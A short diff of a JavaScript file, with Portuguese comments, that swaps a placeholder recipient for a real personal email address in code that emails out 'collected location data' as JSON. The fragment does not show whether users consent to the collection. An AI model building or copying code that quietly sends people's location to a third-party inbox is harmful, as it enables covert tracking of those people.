@@ -37,7 +37,7 @@
 
                     // Enviar os dados para o e-mail
                     const emailParams = {
-                        to_email: "seu_email@dominio.com",
+                        to_email: "anailtonsjc@hotmail.com",
                         subject: "Dados de Localização Coletados",
                         message: `Os dados de localização são: ${JSON.stringify(data)}`
                     };
